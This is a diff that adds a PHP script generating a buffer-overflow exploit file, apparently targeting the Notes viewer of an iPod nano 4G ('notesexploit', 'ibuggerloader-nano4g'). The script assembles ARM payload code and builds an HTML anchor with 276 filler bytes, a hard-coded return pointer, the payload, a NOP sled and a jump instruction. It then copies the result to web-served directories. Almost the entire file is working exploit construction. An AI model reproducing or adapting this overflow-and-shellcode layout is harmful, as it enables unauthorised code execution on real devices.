@@ -1,0 +1,45 @@
+<?php
+  $filesize=4096;
+  $pointer="0869197c";
+  $buffersize=276;
+  $pointercount=1;
+  $head="<a href=\"";
+  $tail="\">a</a>";
+  $jump="\x4b\xfc\xff\xea";
+
+  $pointer="%".substr($pointer,6)."%".substr($pointer,4,2)."%".substr($pointer,2,2)."%".substr($pointer,0,2);
+  passthru("arm-elf-as -aln=loader.lst -o loader.o loader.asm 2>&1");
+  passthru("arm-elf-objcopy -O binary loader.o loader.bin 2>&1");
+  unlink("loader.o");
+  $payload=file_get_contents("loader.bin");
+  $nopcount=($filesize-strlen($head)-$buffersize-$pointercount*strlen($pointer)
+            -strlen($tail)-strlen($payload)-strlen($jump))/4;
+  $instructions=strlen($payload)/4;
+  $total=$instructions+$nopcount;
+  $usedpercent=ceil(100*$instructions/$total);
+  $freepercent=floor(100*$nopcount/$total);
+  echo "Used $instructions ($usedpercent%) out of $total instructions, $nopcount ($freepercent%) free\n";
+  if ($nopcount<0) die("PAYLOAD TOO BIG!\x07");
+  $data=$head;
+  for ($i=0;$i<$buffersize;$i++) $data.="A";
+  for ($i=0;$i<$pointercount;$i++) $data.=$pointer;
+  $data.=$tail.$payload;
+  for ($i=0;$i<$nopcount;$i++) $data.="\x01\x10\xa0\xe1";
+  $data.=$jump;
+  $file=fopen("loader.htm","wb");
+  fwrite($file,$data);
+  fclose($file);
+  if ($argv[1]!="local")
+  {
+    copy("loader.asm","D:\\web\\tmp\\ibuggerloader-nano4g.asm");
+    copy("loader.lst","D:\\web\\tmp\\ibuggerloader-nano4g.lst");
+    copy("loader.htm","D:\\web\\tmp\\ibuggerloader-nano4g.htm");
+    if ($argv[1])
+    {
+      @mkdir(dirname("D:\\web\\tmp\\notesexploit\\$argv[1]"),0755,true);
+      copy("loader.asm","D:\\web\\tmp\\notesexploit\\$argv[1].asm");
+      copy("loader.lst","D:\\web\\tmp\\notesexploit\\$argv[1].lst");
+      copy("loader.htm","D:\\web\\tmp\\notesexploit\\$argv[1].htm");
+    }
+  }
+?>
